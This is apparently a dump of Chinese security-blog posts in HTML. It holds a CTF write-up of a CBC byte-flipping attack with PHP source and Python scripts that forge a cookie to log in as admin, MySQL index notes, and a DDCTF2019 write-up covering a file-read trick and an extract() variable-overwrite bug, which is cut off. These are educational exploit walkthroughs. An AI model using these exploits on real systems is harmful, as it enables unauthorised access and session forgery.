[{"title":"CBC字节翻转攻击","url":"/2018/03/23/CBC-Attack/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a><strong>前言</strong></h1><p>最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目<a href=\"http://118.89.219.210:49168/index.php\" target=\"_blank\" rel=\"noopener\">传送门</a>。</p>\n<a id=\"more\"></a>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a><strong>原理</strong></h1><p>CBC攻击方法的精髓在于通过损坏密文字节来改变明文字节，从而达到绕过过滤器或者提权等目的。贴一张图片</p>\n<p><img src=\"/2018/03/23/CBC-Attack/1.png\" alt=\"加密原理\"></p>\n<blockquote>\n<p><font face=\"futura\">plaintext:</font>待加密的数据</p>\n<p><font face=\"futura\">Ⅳ：</font>用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文</p>\n<p><font face=\"“futura\">Ciphertext：</font>加密后的数据</p>\n</blockquote>\n<p><strong>注意：</strong>CBC工作于一个固定长度的比特组，称之为块(BLOCK)，本文中将使用16字节的块。</p>\n<p><strong>加密过程：</strong></p>\n<p>1.首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。<br>2.生成一个随机的初始化向量(IV)和一个密钥。<br>3.将IV和第一组明文异或。<br>4.用密钥对3中xor后产生的密文加密。<br>5.用4中产生的密文对第二组明文进行xor操作。<br>6.用密钥对5中产生的密文加密。<br>7.重复4-7，到最后一组明文。<br>8.将IV和加密后的密文拼接在一起，得到最终的密文。</p>\n<p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：<em>前一块的密文用来产生后一块的密文</em>。</p>\n<p><strong>解密过程：</strong></p>\n<p><img src=\"/2018/03/23/CBC-Attack/2.png\" alt=\"解密过程\"></p>\n<p>解密过程就是加密过程的逆过程</p>\n<p>1.从密文中提取出IV，然后将密文分组。<br>2.使用密钥对第一组的密文解密，然后和IV进行xor得到明文。<br>3.使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>4.重复2-3，直到最后一组密文。</p>\n<p><strong>攻击原理图</strong></p>\n<p><img src=\"/2018/03/23/CBC-Attack/3.png\" alt=\"攻击过程\"></p>\n<p>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p>\n<p>介绍一下异或的概念</p>\n<blockquote>\n<p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p>\n</blockquote>\n<h1 id=\"上手题目\"><a href=\"#上手题目\" class=\"headerlink\" title=\"上手题目\"></a><strong>上手题目</strong></h1><p>存在目录泄露 <code>.index.php.swp</code>，会下载到一个源码，需要用vim恢复一下，使用下面的命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi -r &#123;your file name&#125;</span><br></pre></td></tr></table></figure>\n<p>然后用下面的命令删除swp文件，不然每一次编辑时总是有这个提示。 </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">rm .&#123;your file name&#125;.swp</span><br></pre></td></tr></table></figure>\n<p>再输入7即可恢复代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html <span class=\"keyword\">PUBLIC</span> <span class=\"string\">\"-//W3C//DTD XHTML 1.0 Transitional//EN\"</span> <span class=\"string\">\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"</span>&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=utf-8\"</span> /&gt;</span><br><span class=\"line\">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class=\"line\">&lt;link href=<span class=\"string\">\"static/css/style.css\"</span> rel=<span class=\"string\">\"stylesheet\"</span> type=<span class=\"string\">\"text/css\"</span> /&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span> src=<span class=\"string\">\"static/js/jquery.min.js\"</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">&lt;script type=<span class=\"string\">\"text/javascript\"</span>&gt;</span><br><span class=\"line\">$(document).ready(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t$(<span class=\"string\">\".username\"</span>).focus(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t$(<span class=\"string\">\".user-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"-48px\"</span>);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">\t$(<span class=\"string\">\".username\"</span>).blur(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t$(<span class=\"string\">\".user-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"0px\"</span>);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t$(<span class=\"string\">\".password\"</span>).focus(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t$(<span class=\"string\">\".pass-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"-48px\"</span>);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">\t$(<span class=\"string\">\".password\"</span>).blur(<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">\t\t$(<span class=\"string\">\".pass-icon\"</span>).css(<span class=\"string\">\"left\"</span>,<span class=\"string\">\"0px\"</span>);</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">define(<span class=\"string\">\"SECRET_KEY\"</span>, file_get_contents(<span class=\"string\">'/root/key'</span>));</span><br><span class=\"line\">define(<span class=\"string\">\"METHOD\"</span>, <span class=\"string\">\"aes-128-cbc\"</span>);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_random_iv</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    $random_iv=<span class=\"string\">''</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">16</span>;$i++)&#123;</span><br><span class=\"line\">        $random_iv.=chr(rand(<span class=\"number\">1</span>,<span class=\"number\">255</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $random_iv;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">login</span><span class=\"params\">($info)</span></span>&#123;</span><br><span class=\"line\">    $iv = get_random_iv();</span><br><span class=\"line\">    $plain = serialize($info);</span><br><span class=\"line\">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class=\"line\">    $_SESSION[<span class=\"string\">'username'</span>] = $info[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"iv\"</span>, base64_encode($iv));</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"cipher\"</span>, base64_encode($cipher));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">check_login</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'cipher'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'iv'</span>]))&#123;</span><br><span class=\"line\">        $cipher = base64_decode($_COOKIE[<span class=\"string\">'cipher'</span>]);</span><br><span class=\"line\">        $iv = base64_decode($_COOKIE[<span class=\"string\">\"iv\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class=\"line\">            $info = unserialize($plain) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>(<span class=\"string\">\"&lt;p&gt;base64_decode('\"</span>.base64_encode($plain).<span class=\"string\">\"') can't unserialize&lt;/p&gt;\"</span>);</span><br><span class=\"line\">            $_SESSION[<span class=\"string\">'username'</span>] = $info[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"ERROR!\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_homepage</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_SESSION[<span class=\"string\">\"username\"</span>]===<span class=\"string\">'admin'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;hello '</span>.$_SESSION[<span class=\"string\">'username'</span>].<span class=\"string\">'&lt;/p&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;p&gt;&lt;a href=\"loginout.php\"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'username'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'password'</span>]))&#123;</span><br><span class=\"line\">    $username = (string)$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    $password = (string)$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($username === <span class=\"string\">'admin'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $info = <span class=\"keyword\">array</span>(<span class=\"string\">'username'</span>=&gt;$username,<span class=\"string\">'password'</span>=&gt;$password);</span><br><span class=\"line\">        login($info);</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">\"username\"</span>]))&#123;</span><br><span class=\"line\">        check_login();</span><br><span class=\"line\">        show_homepage();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'&lt;body class=\"login-body\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;div id=\"wrapper\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;div class=\"user-icon\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;div class=\"pass-icon\"&gt;&lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"header\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"content\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input name=\"username\" type=\"text\" class=\"input username\" value=\"Username\" onfocus=\"this.value=\\'\\'\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input name=\"password\" type=\"password\" class=\"input password\" value=\"Password\" onfocus=\"this.value=\\'\\'\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;div class=\"footer\"&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /&gt;</span></span><br><span class=\"line\"><span class=\"string\">                        &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">                    &lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;/div&gt;</span></span><br><span class=\"line\"><span class=\"string\">            &lt;/body&gt;'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">t</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>一直也不行，心态崩了(2333333…)</p>\n<hr>\n<p>一个星期之后…..</p>\n<hr>\n<p>我胡汉三又回来了！！！！</p>\n<p>我们把返回的cipher值进行翻转，想要翻转第二块的 <code>m</code>为 <code>a</code>只需要把第一行对应第九位翻转一下即可，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">iv = <span class=\"string\">'sDGucEcgR9ixzDNVm6IrpA%3D%3D'</span></span><br><span class=\"line\">cipher_raw = <span class=\"string\">'xhp6%2B1A%2FKctfyU%2BbQeuRx3lUMrDUN%2FOuXg96c%2FJ%2Byn5DX2UVNMavsdocAGjmu6SmuRD6kY8Ef4rLKYADlEeUjQ%3D%3D'</span></span><br><span class=\"line\">print(<span class=\"string\">\"[*]原始iv和cipher\"</span>)</span><br><span class=\"line\">print(<span class=\"string\">'翻转前：'</span>)</span><br><span class=\"line\">print(<span class=\"string\">'cipher_raw:'</span>,cipher_raw)</span><br><span class=\"line\">print(<span class=\"string\">'iv_raw:'</span>,iv)</span><br><span class=\"line\">print(<span class=\"string\">'翻转后：'</span>)</span><br><span class=\"line\">tmp1 = urllib.parse.unquote(cipher_raw)</span><br><span class=\"line\"></span><br><span class=\"line\">cipher = base64.b64decode(tmp1)</span><br><span class=\"line\"><span class=\"comment\"># a:2:&#123;s:8:\"userna</span></span><br><span class=\"line\"><span class=\"comment\"># me\";s:5:\"mdmin\";</span></span><br><span class=\"line\"><span class=\"comment\"># s:8:\"password\";s</span></span><br><span class=\"line\"><span class=\"comment\"># :6:\"123456\";&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">cipher = cipher.decode(<span class=\"string\">'unicode_escape'</span>)</span><br><span class=\"line\">xor_cipher = cipher[<span class=\"number\">0</span>:<span class=\"number\">9</span>] + chr(ord(cipher[<span class=\"number\">9</span>]) ^ ord(<span class=\"string\">'m'</span>) ^ ord(<span class=\"string\">'a'</span>)) + cipher[<span class=\"number\">10</span>:]</span><br><span class=\"line\">xor_cipher = urllib.parse.quote(base64.b64encode(xor_cipher.encode(<span class=\"string\">'latin-1'</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">print(xor_cipher)</span><br></pre></td></tr></table></figure>\n<p>写完这个脚本，我心中又不禁对python的编码问题骂了无数次mmp，真的太多坑了…..</p>\n<p>然后修改cookie中的cipher值，刷新页面（注意此时不能提交数据,要把post数据清空）之后，页面会提示反序列化失败，这是因为我们修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。 </p>\n<p>贴一下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 得到新的iv值</span></span><br><span class=\"line\">iv = <span class=\"string\">'sDGucEcgR9ixzDNVm6IrpA%3D%3D'</span> <span class=\"comment\"># 填写未修改过的iv</span></span><br><span class=\"line\">cipher = <span class=\"string\">'SjeC+xtTva24pYSPdWXIsm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'</span>  <span class=\"comment\"># 填写提示反序列化错误的字符串</span></span><br><span class=\"line\">cipher = base64.b64decode(cipher).decode(<span class=\"string\">'unicode_escape'</span>)</span><br><span class=\"line\">print(<span class=\"string\">'cipher:'</span>,cipher)</span><br><span class=\"line\">iv = base64.b64decode(urllib.parse.unquote(iv))</span><br><span class=\"line\">iv = iv.decode(<span class=\"string\">'unicode_escape'</span>)</span><br><span class=\"line\">newIv = <span class=\"string\">''</span></span><br><span class=\"line\">right = <span class=\"string\">'a:2:&#123;s:8:\"userna'</span>  <span class=\"comment\"># 被损坏前正确的明文</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">16</span>):</span><br><span class=\"line\">    newIv += chr( ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i])) </span><br><span class=\"line\">print(urllib.parse.quote(base64.b64encode(newIv.encode(<span class=\"string\">'latin-1'</span>))))</span><br></pre></td></tr></table></figure>\n<p>将得到的iv替换cookie中的iv，刷新一下页面即可以admin身份登录获取flag。</p>\n","categories":["资料"],"tags":["CTF","Crypto"]},{"title":"MySQL学习笔记(四)","url":"/2018/02/03/MySql4/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。<br><a id=\"more\"></a></p>\n<h1 id=\"MySQL索引\"><a href=\"#MySQL索引\" class=\"headerlink\" title=\"MySQL索引\"></a>MySQL索引</h1><h2 id=\"索引及其作用\"><a href=\"#索引及其作用\" class=\"headerlink\" title=\"索引及其作用\"></a>索引及其作用</h2><p>MySQL索引的存储方式是另外存储一个文件来保存索引值，查找时通过索引定位到行的位置从而快速的查找数据。MySQL索引可以由最多15个列组成，<em>最大索引长度</em> 是<code>256</code>字节。</p>\n<h2 id=\"索引的分类\"><a href=\"#索引的分类\" class=\"headerlink\" title=\"索引的分类\"></a>索引的分类</h2><p>由于索引是保存在文件中的，所以是要占据磁盘空间的，MySQL中一个表的索引都保存在一个索引文件夹中，如果增加删除或者更新表的一行，那么MySQL也会自动的更新索引，保证索引和表中的内容保持一致。</p>\n<p>1、 BTREE索引</p>\n<p>普通索引(INDEX)</p>\n<blockquote>\n<p>这是最基本的索引，没有唯一性约束，</p>\n</blockquote>\n<p>唯一性索引(UNIQUE)</p>\n<blockquote>\n<p>唯一性索引，即每一列的索引值都只能出现一次，必须是唯一的。</p>\n</blockquote>\n<p>主键(PRIMARY KEY)</p>\n<blockquote>\n<p>主键索引，拥有唯一性索引的特点，但是一个表只能有一个主键。既可以在创建的时候指定，也可以通过修改表的方式加入主键。</p>\n</blockquote>\n<p>全文索引(FULLTEXT)</p>\n<blockquote>\n<p>全文索引只能在 <em>VARCHAR</em> 或者 <em>TEXT</em> 类型中使用，并且只能在MyISAM中创建。对于大规模数据集来说，通过 <code>alter table</code>或者 <code>create index</code>命令创建会更快一些。</p>\n</blockquote>\n<p>2、 哈希索引(HASH)</p>\n<p>当表类型为MEMORY或者HEAP时，MySQL还支持HASH索引，当根据一个值获取特定行时，哈希索引非常快。</p>\n<h1 id=\"MySQL索引创建\"><a href=\"#MySQL索引创建\" class=\"headerlink\" title=\"MySQL索引创建\"></a>MySQL索引创建</h1><h2 id=\"create-index\"><a href=\"#create-index\" class=\"headerlink\" title=\"create index\"></a>create index</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> [<span class=\"keyword\">unique</span> | fulltext | spatial] <span class=\"keyword\">index</span> 索引名</span><br><span class=\"line\">\t[索引类型]</span><br><span class=\"line\">\t<span class=\"keyword\">on</span> 表名 (索引列名,)</span><br><span class=\"line\">\t[索引选项] ...</span><br><span class=\"line\">索引列名=:</span><br><span class=\"line\">\t列名 [(长度)] [<span class=\"keyword\">asc</span> | <span class=\"keyword\">desc</span>]</span><br></pre></td></tr></table></figure>\n<p>说明</p>\n<blockquote>\n<p>spatial为空间索引<br>索引类型包括BTREE和HASH<br><code>create index</code>不能创建 <em>主键</em><br>索引列名，创建索引列名后的长度表示该列前面创建索引字符个数，这可以节省磁盘空间。</p>\n</blockquote>\n<p><strong>举例</strong></p>\n<p>根据sx表的学号列上的前5个字符建立一个升序索引xh_xs</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">index</span> xh_xs</span><br><span class=\"line\">\t<span class=\"keyword\">on</span> xs(学号(<span class=\"number\">5</span>) <span class=\"keyword\">asc</span>);</span><br></pre></td></tr></table></figure>\n<h2 id=\"alter-table创建\"><a href=\"#alter-table创建\" class=\"headerlink\" title=\"alter table创建\"></a>alter table创建</h2><p>略</p>\n<h2 id=\"建表时创建索引\"><a href=\"#建表时创建索引\" class=\"headerlink\" title=\"建表时创建索引\"></a>建表时创建索引</h2><p>略</p>\n<h2 id=\"删除索引\"><a href=\"#删除索引\" class=\"headerlink\" title=\"删除索引\"></a>删除索引</h2><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">drop</span> <span class=\"keyword\">index</span> 索引名 <span class=\"keyword\">on</span> 表名</span><br></pre></td></tr></table></figure>\n<p>或者</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">alter</span> [<span class=\"keyword\">ignore</span>] <span class=\"keyword\">table</span> 表名</span><br><span class=\"line\">...</span><br><span class=\"line\">|<span class=\"keyword\">drop</span> primary <span class=\"keyword\">key</span>              <span class=\"comment\"># 删除主键</span></span><br><span class=\"line\">|<span class=\"keyword\">drop</span> &#123;<span class=\"keyword\">index</span>|<span class=\"keyword\">key</span>&#125; 索引名       <span class=\"comment\"># 删除索引</span></span><br><span class=\"line\">|<span class=\"keyword\">drop</span> <span class=\"keyword\">foreign</span> <span class=\"keyword\">key</span> fk_symbo     <span class=\"comment\"># 删除外键</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"CHECK完整性约束\"><a href=\"#CHECK完整性约束\" class=\"headerlink\" title=\"CHECK完整性约束\"></a>CHECK完整性约束</h1><p><strong>语法格式</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">check</span>(expr)</span><br></pre></td></tr></table></figure>\n<p><strong>举例</strong></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> student</span><br><span class=\"line\">(</span><br><span class=\"line\">\t学号  <span class=\"built_in\">char</span>(<span class=\"number\">6</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span>,</span><br><span class=\"line\">\t性别 <span class=\"built_in\">char</span>(<span class=\"number\">1</span>) <span class=\"keyword\">not</span> <span class=\"literal\">null</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">check</span>(性别 <span class=\"keyword\">in</span> (<span class=\"string\">'男'</span>,<span class=\"string\">'女'</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">)；</span><br></pre></td></tr></table></figure>\n","categories":["资料"],"tags":["SQL"]},{"title":"DDCTF2019","url":"/2020/09/13/DDCTF2019/","content":"<p>历史文章补发</p>\n<a id=\"more\"></a>\n<h1 id=\"滴\"><a href=\"#滴\" class=\"headerlink\" title=\"滴~\"></a>滴~</h1><p>签到题</p>\n<p>访问首页看到jpg参数请求有点想base64，测试发现是将文件名进行16进制编码后再进行两次base64编码，按照该方法构造index.php发现可以实现成功读取到index.php源码 </p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class=\"line\"><span class=\"comment\"> * Date: July 4,2018</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class=\"line\">header(<span class=\"string\">'content-type:text/html;charset=utf-8'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(! <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'jpg'</span>]))</span><br><span class=\"line\">    header(<span class=\"string\">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span><br><span class=\"line\">$file = hex2bin(base64_decode(base64_decode($_GET[<span class=\"string\">'jpg'</span>])));</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'&lt;title&gt;'</span>.$_GET[<span class=\"string\">'jpg'</span>].<span class=\"string\">'&lt;/title&gt;'</span>;</span><br><span class=\"line\">$file = preg_replace(<span class=\"string\">\"/[^a-zA-Z0-9.]+/\"</span>,<span class=\"string\">\"\"</span>, $file);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $file.<span class=\"string\">'&lt;/br&gt;'</span>;</span><br><span class=\"line\">$file = str_replace(<span class=\"string\">\"config\"</span>,<span class=\"string\">\"!\"</span>, $file);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $file.<span class=\"string\">'&lt;/br&gt;'</span>;</span><br><span class=\"line\">$txt = base64_encode(file_get_contents($file));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;img src='data:image/gif;base64,\"</span>.$txt.<span class=\"string\">\"'&gt;&lt;/img&gt;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Can you find the flag file?</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发现了注释中有文章链接，访问之后看到历史文章有和注释中日期相同的文章，发现是swp文件泄露的相关文章，测试发现存在<code>practice.txt.swp</code>页面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">f1ag!ddctf.php</span><br></pre></td></tr></table></figure>\n<p>我们可以按照上面的方法读取该文件，因为该页面过滤特殊字符，但是同时又把<code>config</code>替换为<code>!</code>，所以我们可以构造文件名<code>f1agconfigddctf.php</code>成功读取到源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">include</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\">$k = <span class=\"string\">'hello'</span>;</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($uid))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $content=trim(file_get_contents($k));</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($uid==$content)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span> $flag;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">echo</span><span class=\"string\">'hello'</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>很明显的变量覆盖漏洞</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 